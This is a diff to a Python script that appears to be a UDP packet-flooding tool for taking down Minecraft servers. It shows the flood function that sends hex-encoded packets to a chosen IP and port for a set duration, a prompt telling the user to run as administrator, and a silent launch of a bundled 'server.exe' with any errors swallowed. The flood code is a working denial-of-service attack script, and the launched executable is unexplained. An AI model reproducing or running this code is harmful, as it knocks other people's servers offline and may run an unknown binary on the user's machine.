@@ -7,6 +7,7 @@ import sys
 import random
 import socket
 import threading
+import random
 init()
 os.system("cls")
 username = os.getenv('username')
@@ -70,14 +71,17 @@ input(Fore.WHITE + "[" + Fore.RED + "+" + Fore.WHITE + "]" "press [ENTER] to sta
 # -*- coding: utf-8 -*-
 
 if ctypes.windll.shell32.IsUserAnAdmin() != True:
-    print(Fore.WHITE + "[" + Fore.RED + "WARNING" + Fore.WHITE + "]" "not an admin, connection rate will be slow!")
+    print(Fore.WHITE + "[" + Fore.RED + "WARNING" + Fore.WHITE + "]" "threading is disabled so connection rate will be slow! please restart terminal as administrator")
     time.sleep(5)
     os.system("cls")
 
 print(Fore.WHITE + "[" + Fore.RED + "+" + Fore.WHITE + "]" " starting...")
 
 cwd = os.getcwd()
-os.startfile(f"{cwd}\\serv\\sv\\server.exe")
+try:
+ os.startfile(f"{cwd}\\serv\\sv\\server.exe")
+except:
+ pass
 def minecraftsexptdr(ip,port,temps):
     timeout = time.time() + float(temps)
     udpsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -97,8 +101,14 @@ def minecraftsexptdr(ip,port,temps):
                             udpsock.sendto(bytes.fromhex(hex) + bytes,(ip,int(port)))
                             #rawsock.sendto(bytes.fromhex(hex) + bytes,(ip,int(port))) 
                             sent = sent + 1
+                            if (random.randint(0,10000)) == 1:
+                             print(Back.RED + f"[{sent}]" + Back.BLACK + f" sent {sent} udp packets to {ip}:{port} ")
+                            else:
+                             pass
                     except KeyboardInterrupt:
                             sys.exit(os.system("clear"))
+
+
 
 def main():
     ip = targetIP
